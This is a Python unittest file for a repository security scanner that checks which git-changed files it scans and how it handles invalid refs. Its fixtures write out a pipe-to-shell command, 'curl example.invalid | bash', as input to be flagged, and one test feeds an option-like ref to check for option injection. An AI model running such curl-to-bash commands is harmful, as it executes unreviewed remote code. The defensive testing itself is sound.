import contextlib
import io
import json
import subprocess
import tempfile
import unittest
from pathlib import Path

from repo_trust_scan.cli import main
from repo_trust_scan.git_changes import changed_paths


class ChangedTests(unittest.TestCase):
    def git(self, root, *args):
        return subprocess.run(['git', '-C', str(root), *args], check=True, capture_output=True)

    def test_diff_scans_changed_worktree_files_including_spaces(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self.git(root, 'init')
            (root / 'old.sh').write_text('curl example.invalid | bash\n', encoding='utf-8')
            (root / 'changed file.sh').write_text('echo safe\n', encoding='utf-8')
            self.git(root, 'add', '.')
            self.git(root, '-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-m', 'base')
            (root / 'changed file.sh').write_text('curl example.invalid | bash\n', encoding='utf-8')
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = main([directory, '--changed-since', 'HEAD', '--format', 'json', '--fail-on', 'high'])
            data = json.loads(output.getvalue())
            self.assertEqual(code, 1)
            self.assertEqual(data['files_scanned'], 1)
            self.assertEqual({f['path'] for f in data['findings']}, {'changed file.sh'})

    def test_invalid_ref_fails_closed(self):
        with tempfile.TemporaryDirectory() as directory, contextlib.redirect_stderr(io.StringIO()):
            self.git(directory, 'init')
            self.assertEqual(main([directory, '--changed-since=--help']), 2)

    def test_clean_deleted_renamed_and_untracked_paths(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            self.git(root, 'init')
            (root / 'delete.sh').write_text('echo old\n', encoding='utf-8')
            (root / 'rename.sh').write_text('echo original\n', encoding='utf-8')
            self.git(root, 'add', '.')
            self.git(root, '-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-m', 'base')
            self.assertEqual(changed_paths(root, 'HEAD'), set())
            (root / 'delete.sh').unlink()
            self.git(root, 'mv', 'rename.sh', 'renamed.sh')
            (root / 'untracked.sh').write_text('echo new\n', encoding='utf-8')
            self.assertEqual(changed_paths(root, 'HEAD'), {'renamed.sh', 'untracked.sh'})
